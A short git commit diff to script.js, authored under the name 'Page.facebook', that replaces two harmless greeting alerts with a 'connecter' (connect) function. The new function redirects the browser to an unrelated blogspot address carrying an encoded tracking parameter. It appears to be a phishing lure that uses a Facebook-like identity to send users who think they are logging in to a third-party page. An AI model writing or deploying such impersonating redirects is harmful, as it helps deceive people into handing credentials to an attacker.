8ba3fb9983cc73fd7f07a441cb539f28c3dc6352
Page.facebook <mcbbiink@gmail.com>
2025-05-15 07:21:08 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,3 @@
-function direBonjour() {
-  alert("Bonjour !");
-}
-
-function direBonsoir() {
-  alert("Bonsoir !");
+function connecter() {
+  window.location.href = "https://gagagagsuiys.blogspot.com/?url=NTRmMDlmZGMtOWFjNy00MjM3LTg4MjUtYjE2OTllZTI0MzA5X3F1ZXJ5XzRlM2JmMWQ1LTNmNzYtNGJjZC05YjM3LWY3NDFjN2I1OTJhNw==";
 }
